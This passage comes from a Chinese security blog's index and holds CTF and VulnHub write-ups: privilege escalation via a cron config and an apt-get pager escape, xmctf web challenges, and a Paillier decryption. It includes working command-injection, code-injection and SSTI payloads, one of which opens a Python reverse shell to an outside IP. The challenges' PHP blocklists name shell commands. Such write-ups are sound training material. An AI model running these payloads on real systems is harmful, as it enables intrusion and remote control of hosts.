class=\"string\">'%d-%m-%Y'</span>)</span><br><span class=\"line\">                        b = dt.strptime(file2[<span class=\"number\">0</span>], <span class=\"string\">'%d-%m-%Y'</span>)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> b &lt; a:</span><br><span class=\"line\">                    filename = files[<span class=\"number\">0</span>]</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    filename = files[<span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">            sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> filename</span><br></pre></td></tr></table></figure>\n\n<p>两个函数，read_config读取路径下config文件，set_config_path搜索对应路径下以json格式结尾的两个文件，将文件名以<code>.</code>为间隔分为数组，使用strptime函数处理获取文件的时间为日期格式，使得file1,file为形如<code>[&#39;xx-xx-xx&#39;,&#39;config&#39;,&#39;.json&#39;]</code>的格式，比较两个文件的时间，若是/tmp文件下文件较早，返回home目录下json文件，相反返回/tmp目录下json文件</p>\n<p>.syncer.cpython-38.pyc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> configuration <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> connectors.ftpconn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> connectors.sshconn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> connectors.utils <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"Main function</span></span><br><span class=\"line\"><span class=\"string\">    Cron job is going to make my work easy peasy</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\">    configPath = ConfigReader.set_config_path()</span><br><span class=\"line\">    config = ConfigReader.read_config(configPath)</span><br><span class=\"line\">    connections = checker(config)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">'FTP'</span> <span class=\"keyword\">in</span> connections:</span><br><span class=\"line\">        ftpcon(config[<span class=\"string\">'FTP'</span>])</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'SSH'</span> <span class=\"keyword\">in</span> connections:</span><br><span class=\"line\">            sshcon(config[<span class=\"string\">'SSH'</span>])</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">'URL'</span> <span class=\"keyword\">in</span> connections:</span><br><span class=\"line\">                sync(config[<span class=\"string\">'URL'</span>], config[<span class=\"string\">'Output'</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    main()</span><br></pre></td></tr></table></figure>\n\n<p>main函数根据文件内容选择连接方式</p>\n<p>通过上传的工具查看进程可以知道saint目录下会定时执行脚本文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120191604.png\" alt=\"\"></p>\n<p>猜测是执行上面两个脚本，已知文件格式，尝试构造文件，利用main的连接方式进行ssh免密登录</p>\n<p>首先<code>ssh-keygen</code>在本机生成一个公私钥对</p>\n<p>复制id_rsa.pub内容，新建一个authorized_keys文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120195048.png\" alt=\"\"></p>\n<p>创建<code>20-11-2020.config.json</code>文件，内容如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">        &quot;URL&quot;:&quot;http:&#x2F;&#x2F;192.168.118.108:9901&#x2F;authorized_keys&quot;,</span><br><span class=\"line\">        &quot;Output&quot;:&quot;&#x2F;home&#x2F;saint&#x2F;.ssh&#x2F;authorized_keys&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>完成后本地python开一个http服务器等待</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120195322.png\" alt=\"\"></p>\n<p>靶机tmp目录wget下载json文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120194247.png\" alt=\"\"></p>\n<p>这样，脚本执行时就会下载本机的key再输出覆盖到saint用户的key，从而实行远程ssh免密登录</p>\n<p>等待saint用户home下脚本执行，成功ssh登录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120195728.png\" alt=\"\"></p>\n<h3 id=\"添加用户\"><a href=\"#添加用户\" class=\"headerlink\" title=\"添加用户\"></a>添加用户</h3><p><code>sudo -l</code>可以免密执行adduser</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120200055.png\" alt=\"\"></p>\n<p>可以添加root组用户</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120200322.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120200445.png\" alt=\"\"></p>\n<h3 id=\"查看sudoers文件\"><a href=\"#查看sudoers文件\" class=\"headerlink\" title=\"查看sudoers文件\"></a>查看sudoers文件</h3><p>有了root权限，可以查看其他可以执行sudo组命令的文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201350.png\" alt=\"\"></p>\n<p>jason用户不存在，返回saint用户创建</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201453.png\" alt=\"\"></p>\n<h3 id=\"apt-get提权\"><a href=\"#apt-get提权\" class=\"headerlink\" title=\"apt-get提权\"></a>apt-get提权</h3><p>apt除了可以安装包之外</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201816.png\" alt=\"\"></p>\n<p>查看它的帮助选项</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120201922.png\" alt=\"\"></p>\n<p>有个changelog命令可以展示目标包的变更日志，并且测试发现是分页模式下阅读</p>\n<p>之前已经学到，如果我们在这种分页状态下输入诸如<code>!+command</code>的指令，命令就会执行</p>\n<p>输入<code>sudo apt-get changelog tree</code>，在分页模式下输入bash</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120202928.png\" alt=\"\"></p>\n<p>成功执行，拿到root权限</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120203054.png\" alt=\"\"></p>\n<p>完成</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201120203122.png\" alt=\"\"></p>\n","categories":["vulnhub"]},{"title":"xmctf平台部分web","url":"/2020/06/24/xmctf_web_wp/","content":"<p>xmctf部分web</p>\n<p>平台：xmctf.top</p>\n<a id=\"more\"></a>\n\n<h3 id=\"easy-web\"><a href=\"#easy-web\" class=\"headerlink\" title=\"easy-web\"></a>easy-web</h3><p>打开靶机源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">$key = <span class=\"string\">\"bad\"</span>;</span><br><span class=\"line\">extract($_POST);</span><br><span class=\"line\"><span class=\"keyword\">if</span>($key === <span class=\"string\">'bad'</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>(<span class=\"string\">'badbad!!!'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$act = @$_GET[<span class=\"string\">'act'</span>];</span><br><span class=\"line\">$arg = @$_GET[<span class=\"string\">'arg'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span>(preg_match(<span class=\"string\">'/^[a-z0-9_]*$/isD'</span>,$act)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">'check'</span>;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    $act($arg,<span class=\"string\">''</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">'666'</span>;</span><br><span class=\"line\">badbad!!!</span><br></pre></td></tr></table></figure>\n\n<p>存在一个变量key为bad，定义了值为bad所以die出badbad，get传参两个参数act和arg，正则匹配a-z，0-9，/i不区分大小写<br>/s匹配任何不可见字符，包括空格、制表符、换页符等等，/D如果使用$限制结尾字符,则不允许结尾有换行</p>\n<p>需要绕过if正则匹配，从而控制arg参数</p>\n<p>考点：create_function代码注入</p>\n<blockquote>\n<p>create_function：根据传递的参数创建匿名函数，并为其返回唯一名称</p>\n<p>语法:<br>create_function(string $args,string $code)<br>//string $args 声明的函数变量部分<br>//string $code 执行的方法代码部分</p>\n</blockquote>\n<p>第一步要让key不die掉，直接post一个key把原来的key覆盖掉即可<br>然后想要函数正常调用，那就必须绕过正则，因此我们要在函数名的头或者尾加上一个字符<code>\\</code></p>\n<blockquote>\n<p>php里默认命名空间是\\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>\n</blockquote>\n<p>那么接下来就是利用<code>$act($arg,&#39;&#39;);</code>进行代码注入了。</p>\n<p>payload：<code>?act=\\create_function&amp;arg=){return%20123;}system(%27dir%27);//</code><br>传入之后</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$act($arg,&#39;&#39;);</span><br><span class=\"line\">create_function()&#123;return%20123;&#125;system(%27dir%27);&#x2F;&#x2F;,&#39;&#39;)</span><br></pre></td></tr></table></figure>\n\n<p>实际上也就是这样</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">function a&#123;</span><br><span class=\"line\">return%20123;&#125;system(%27dir%27);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>函数被闭合，就可以执行任意命令了。<br>读flag:</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623224807.png\" alt=\"\"></p>\n<h3 id=\"RCE-训练\"><a href=\"#RCE-训练\" class=\"headerlink\" title=\"RCE-训练\"></a>RCE-训练</h3><p>打开靶机得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__file__</span>);</span><br><span class=\"line\">$ip = $_GET[<span class=\"string\">'ip'</span>];</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($ip)) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/(;|`| |&amp;|cp|mv|cat|tail|more|rev|tac|\\*|\\&#123;)/i\"</span>, $ip))&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"string\">\"hack\"</span>);</span><br><span class=\"line\">  &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/.*f.*l.*a.*g.*/\"</span>, $ip))&#123;</span><br><span class=\"line\">      <span class=\"keyword\">die</span>(<span class=\"string\">\"no!&gt;\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  $a = shell_exec(<span class=\"string\">\"ping -c 4 \"</span>.$ip);</span><br><span class=\"line\">  var_dump($a);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>主要两个正则，第一个过滤一些文件读取命令，第二个匹配flag的任意单个或多个字符串。<br>经测试可以用<code>|</code>进行命令执行<br><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623225636.png\" alt=\"\"></p>\n<p>那么关键是绕过了，可以利用shell命令构造</p>\n<p>payload：<code>?ip=127.0.0.1|echo$IFS$9bHMgLw|base64$IFS$1-d|sh</code><br>$IFS$9代替空格，bHMgLw-&gt;ls /，输出给base64还原然后sh执行</p>\n<p>那么读取flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200623230422.png\" alt=\"\"></p>\n<h3 id=\"web4\"><a href=\"#web4\" class=\"headerlink\" title=\"web4\"></a>web4</h3><p>打开靶机有一串md5代码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624074453.png\" alt=\"\"></p>\n<p>解析后为1.1.1.1，抓包加个xff头成功下一步</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624075157.png\" alt=\"\"></p>\n<p>打开php得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">$disable_fun = [<span class=\"string\">\"assert\"</span>,<span class=\"string\">\"print_r\"</span>,<span class=\"string\">\"system\"</span>, <span class=\"string\">\"shell_exec\"</span>,<span class=\"string\">\"ini_set\"</span>, <span class=\"string\">\"scandir\"</span>, <span class=\"string\">\"exec\"</span>,<span class=\"string\">\"proc_open\"</span>, <span class=\"string\">\"error_log\"</span>, <span class=\"string\">\"ini_alter\"</span>, <span class=\"string\">\"ini_set\"</span>, <span class=\"string\">\"pfsockopen\"</span>, <span class=\"string\">\"readfile\"</span>, <span class=\"string\">\"echo\"</span>, <span class=\"string\">\"file_get_contents\"</span>, <span class=\"string\">\"readlink\"</span>, <span class=\"string\">\"symlink\"</span>, <span class=\"string\">\"popen\"</span>, <span class=\"string\">\"fopen\"</span>, <span class=\"string\">\"file\"</span>, <span class=\"string\">\"fpassthru\"</span>];</span><br><span class=\"line\">$disable_fun = array_merge($disable_fun, get_defined_functions()[<span class=\"string\">'internal'</span>]);</span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($disable_fun <span class=\"keyword\">as</span> $i)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(stristr($_GET[shell], $i)!==<span class=\"keyword\">false</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'xmctf'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">eval</span>($_GET[shell]);</span><br></pre></td></tr></table></figure>\n\n<p>disable_fun列表是一些文件操作函数，array_merge将多个数组单元合并，get_defined_functions返回数组，foreach遍历新的disable_function并传递给$i，if检测如果传入的shell中在数组中出现，则die，过了if检测则输出shell内容</p>\n<p>直接变量拼接，payload：?shell=$a;$a=’syst’.’em’;$a(“cat flag.php”);<br>传入在源码得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083307.png\" alt=\"\"></p>\n<h3 id=\"web8\"><a href=\"#web8\" class=\"headerlink\" title=\"web8\"></a>web8</h3><p>打开靶机</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083629.png\" alt=\"\"></p>\n<p>传入<code>?name=4</code>回显</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624083748.png\" alt=\"\"></p>\n<p>猜测为模板注入，<code></code>查看配置信息，发现secret_key泄露</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085221.png\" alt=\"\"></p>\n<p>那么考虑session伪造了，查看cookie部分发现jwt</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085025.png\" alt=\"\"></p>\n<p>解密得<code>{&#39;username&#39;: b&#39;guest&#39;}</code>，利用flask_session_cookie_manager脚本伪造admin</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085650.png\" alt=\"\"></p>\n<p>修改session访问/flag即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624085732.png\" alt=\"\"></p>\n<h3 id=\"web11\"><a href=\"#web11\" class=\"headerlink\" title=\"web11\"></a>web11</h3><p>打开靶机只有一句hello，guest，讲道理要是没做web8我都想不到要传name。。。。<br>测试之后发现还是模板注入，</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194649.png\" alt=\"\"></p>\n<p>不过测试之后发现过了了很多东西，config，下划线，点号等等</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624194943.png\" alt=\"\"></p>\n<p>也没有了session伪造不了，那么只能命令执行了。</p>\n<p>payload：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&#123;&quot;&quot;[request[&quot;ar&quot;+&quot;gs&quot;][&quot;class&quot;]][request[&quot;ar&quot;+&quot;gs&quot;][&quot;mro&quot;]][1][request[&quot;ar&quot;+&quot;gs&quot;][&quot;subclass&quot;]]()[286][request[&quot;ar&quot;+&quot;gs&quot;][&quot;init&quot;]][request[&quot;ar&quot;+&quot;gs&quot;][&quot;globals&quot;]][&quot;os&quot;][&quot;popen&quot;](request[&quot;ar&quot;+&quot;gs&quot;][&quot;cmd&quot;])[&quot;read&quot;]()&#125;&#125;&amp;class&#x3D;__class__&amp;mro&#x3D;__mro__&amp;subclass&#x3D;__subclasses__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;cmd&#x3D;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;47.98.134.220&quot;,3122));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>\n\n<p>用<code>request[&quot;args&quot;][&quot;xx&quot;]</code>配合赋值代替双下划线，后面开个python服务器连上自己的ecs，nc监听</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200625205840.png\" alt=\"\"></p>\n<p>读取flag即可。</p>\n<h3 id=\"web12\"><a href=\"#web12\" class=\"headerlink\" title=\"web12\"></a>web12</h3><p>打开靶机得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag在哪里呢？</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">header(<span class=\"string\">\"Content-Type: text/html;charset=utf-8\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"flag.php\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">\"flag在哪里呢？&lt;br&gt;\"</span>;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'exp'</span>]))&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">'/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i'</span>, $_GET[<span class=\"string\">'exp'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"string\">';'</span> === preg_replace(<span class=\"string\">'/[a-z,_]+\\((?R)?\\)/'</span>, <span class=\"keyword\">NULL</span>, $_GET[<span class=\"string\">'exp'</span>])) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!preg_match(<span class=\"string\">'/et|cu|readfile|flip|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class=\"string\">'exp'</span>])) &#123;</span><br><span class=\"line\">                <span class=\"comment\">// echo $_GET['exp'];</span></span><br><span class=\"line\">                @<span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'exp'</span>]);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"keyword\">die</span>(<span class=\"string\">\"还差一点哦！\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"再好好想想！\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"还想读flag，臭弟弟！\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// highlight_file(__FILE__);</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>主要三层正则匹配，第一层禁用了几个伪协议，第二层匹配a-z，逗号，下划线，(?R)引用当前表达式，(?R)?代表可以有引用，也可以没有，引用则变成<code>[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\)</code>的形式，可以一直迭代下去。这样可以匹配一些诸如print(echo(1))括号和字符组成的字符集，第三个禁用一些函数</p>\n<p>payload：<code>?exp=print_r(scandir(pos(localeconv())));</code>，scandir列出目录，pos返回数组中的当前单元, 默认取第一个值，localeconv返回数组。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624201535.png\" alt=\"\"></p>\n<p>那么读取flag.php，next函数读取php的第一个元素的下一个元素，flag.php是倒数第二个，所以可以把用array_reverse把数组倒过来再用next指向flag.php，最后用highlight_file读取。<br>payload：<code>highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200624202207.png\" alt=\"\"></p>\n","categories":["CTF"],"tags":["bypass","ssti","RCE"]},{"title":"安恒四月春季战[not RSA]","url":"/2020/04/26/note9/","content":"<p>​                                                                    </p>\n<p>安恒四月赛的一道crypto题，学习写脚本的第n天。</p>\n<a id=\"more\"></a>\n\n<p>下载附件得：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> getPrime <span class=\"keyword\">as</span> getprime ,long_to_bytes,bytes_to_long,inverse</span><br><span class=\"line\"><span class=\"keyword\">from</span> secret <span class=\"keyword\">import</span> flag,p,q</span><br><span class=\"line\"><span class=\"keyword\">from</span> sympy <span class=\"keyword\">import</span> isprime,nextprime</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\">m=bytes_to_long(flag)</span><br><span class=\"line\">n=p*q</span><br><span class=\"line\">g=n+<span class=\"number\">1</span></span><br><span class=\"line\">r=random.randint(<span class=\"number\">1</span>,n)</span><br><span class=\"line\"></span><br><span class=\"line\">c=(pow(g,m,n*n)*pow(r,n,n*n))%(n*n)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"c=%d\"</span>%(c)</span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">\"n=%d\"</span>%(n)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">c=29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class=\"line\"><span class=\"string\">n=6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br></pre></td></tr></table></figure>\n\n<p>分析一下。</p>\n<p>从 secret 导入flag，p，q的值，flag经bytes_to_long处理转换为长整数传递给m，n为p,q乘积，g的值为n+1，r是由random.randint(1,n)产生的 1 到 n 的一个整数型随机数。</p>\n<p>再看c的等式，对于pow()函数，pow(x,y,z)表示x的y次幂除以z的余数，即等价于x**y%z，即c的值经过两个pow函数的乘积再对n的平方取余。</p>\n<p>最后是打印出c,n的值，且下方已给出。</p>\n<p>题目明确说了不是RSA，看了半天也没看出来这是个什么算法，后来才知道是<a href=\"https://en.wikipedia.org/wiki/Paillier_cryptosystem\" target=\"_blank\" rel=\"noopener\">Paillier_cryptosystem</a>，得知加密方式为：</p>\n<p><img src=\"/images/image-20200426184805920.png\" alt=\"image-20200426184805920\"></p>\n<p>可以看到c的等式符合，再验证一下r：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import random</span><br><span class=\"line\">from math import gcd</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">n&#x3D;6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span><br><span class=\"line\"></span><br><span class=\"line\">r&#x3D;random.randint(1,n)</span><br><span class=\"line\">if gcd(r,n)&#x3D;&#x3D;1:</span><br><span class=\"line\">    print(&#39;right&#39;)</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/image-20200426185142142.png\" alt=\"image-20200426185142142\"></p>\n<p>符合加密方式。接下来按照解密方式编写脚本即可：</p>\n<p><img src=\"/images/image-20200426185319190.png\" alt=\"image-20200426185319190\"></p>\n<p>嗯。。。这里又看懵了，继续找资料，在wiki上找到：</p>\n<ul>\n<li>L(x)=(x−1)/n</li>\n<li>本题p,q的长度相等，λ，μ的值如下：</li>\n</ul>\n<p><img src=\"/images/image-20200426191435535.png\" alt=\"image-20200426191435535\"></p>\n<p>好的一步一步来，首先分解n，这里用yafu很快就算出来了(factordb无效，再次吐槽)：</p>\n<p><img src=\"/images/image-20200426192429587.png\" alt=\"image-20200426192429587\"></p>\n<p>然后尝试套用公式写脚本，太菜了。。。。写了蛮久，学到了gmpy库的powmod函数用法。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"><span class=\"keyword\">from</span> gmpy2 <span class=\"keyword\">import</span> powmod,invert</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p = <span class=\"number\">80006336965345725157774618059504992841841040207998249416678435780577798937819</span></span><br><span class=\"line\">q = <span class=\"number\">80006336965345725157774618059504992841841040207998249416678435780577798937447</span></span><br><span class=\"line\">n=<span class=\"number\">6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093</span></span><br><span class=\"line\">c=<span class=\"number\">29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549</span></span><br><span class=\"line\"></span><br><span class=\"line\">phi = (p<span class=\"number\">-1</span>)*(q<span class=\"number\">-1</span>) </span><br><span class=\"line\">lamuda = phi <span class=\"comment\">#λ</span></span><br><span class=\"line\">mo = powmod(c,lamuda,n*n) <span class=\"comment\">#快速幂取模方法</span></span><br><span class=\"line\">miu = invert(lamuda,n) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">L</span><span class=\"params\">(x)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (x<span class=\"number\">-1</span>)//n </span><br><span class=\"line\"></span><br><span class=\"line\">m = L(mo)</span><br><span class=\"line\">fina = (m*miu)%n</span><br><span class=\"line\"></span><br><span class=\"line\">flag = long_to_bytes(fina)</span><br><span class=\"line\"></span><br><span class=\"line\">print(flag)</span><br></pre></td></tr></table></figure>\n\n<p>得到flag：</p>\n<p><img src=\"/images/image-20200426203419593.png\" alt=\"image-20200426203419593\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><ul>\n<li>了解到了没见过的加密方式</li>\n<li>脚本技能增长了一点点</li>\n</ul>\n","categories":["CTF"],"tags":["crypto"]},{"title":"vulnhub——me_and_my_girlfriend","url":"/2020/10/07/vulnhub_me_and_my_girlfriend/","content":"<h2 id=\"me-and-my-girlfriend\"><a href=\"#me-and-my-girlfriend\" class=\"headerlink\" title=\"me and my girlfriend\"></a>me and my girlfriend</h2><h3 id=\"主机发现\"><a href=\"#主机发现\" class=\"headerlink\" title=\"主机发现\"></a>主机发现</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007104215.png\" alt=\"\"></p>\n<h3 id=\"扫描开放端口\"><a href=\"#扫描开放端口\" class=\"headerlink\" title=\"扫描开放端口\"></a>扫描开放端口</h3><p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007104412.png\" alt=\"\"></p>\n<p>访问下80</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20201007104523.png\" alt=\"\"></p>\n<p>猜测是xff伪造，伪造下刷新</p>\n<p><img 